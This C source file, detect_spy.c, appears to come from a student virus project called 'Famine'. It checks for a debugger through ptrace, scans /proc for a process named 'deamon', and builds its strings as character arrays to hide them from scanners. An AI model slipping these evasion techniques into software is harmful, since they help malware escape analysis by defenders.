/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   detect_spy.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/07 06:44:47 by jfortin           #+#    #+#             */
/*   Updated: 2019/06/13 23:32:07 by jfortin          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdbool.h>
#include <stddef.h>
#include "syscall.h"
#include "utils.h"

#define SIZE_BUFF_STAT 32 // (strlen of pid_max) + TASK_COMM_LEN

static bool	is_target(char *path, char *path_end)
{
	char	buff_stat[SIZE_BUFF_STAT];
	char	*target_process = (char[]){'(', 'd', 'e', 'a', 'm', 'o', 'n', ')', '\0'};
	char	*stat_file = (char[]){'/', 's', 't', 'a', 't', '\0'};

	ft_strcpy(path_end, stat_file);

	int fd = famine_open(path, O_RDONLY);
	if (fd < 0) return false;

	int len = famine_read(fd, buff_stat, SIZE_BUFF_STAT);
	if (len < 0) {famine_close(fd); return false;}

	if (ft_strstr(buff_stat, target_process))
		{famine_close(fd); return true;}

	famine_close(fd);
	return false;
}

static bool	browse_dirent(char *path, char *path_end, \
			const char *buff_dirent, int nread)
{
	for (int bpos = 0; bpos < nread;)
	{
		struct dirent64	*file = (struct dirent64*)(buff_dirent + bpos);
		if (file->d_type == DT_DIR && file->d_name[0] != '.') // we respect your privacy ;)
		{
			ft_strcpy(path_end, file->d_name);
			if (is_target(path, path_end + ft_strlen(file->d_name)))
				return true;
		}
		bpos += file->d_reclen;
	}
	return false;
}

static bool	detect_process(void)
{
	char	path[PATH_MAX];
	char	*path_end;
	char	buff_dirent[1024];
	int	nread;
	char	*proc_str = (char[]){'/', 'p', 'r', 'o', 'c', '/', '\0'};

	ft_strcpy(path, proc_str);
	path_end = path + ft_strlen(proc_str);

	int	fd = famine_open(path, O_RDONLY);
	if (fd == -1) return true;

	while ((nread = famine_getdents64(fd, (void*)buff_dirent, 1024)) > 0)
	{
		if (browse_dirent(path, path_end, buff_dirent, nread))
			{famine_close(fd); return true;}
	}
	famine_close(fd);
	return false;
}

bool		detect_spy(void)
{
	if (famine_ptrace(PTRACE_TRACEME, 0, NULL, 0) == -1)
		return true;
	return detect_process();
}
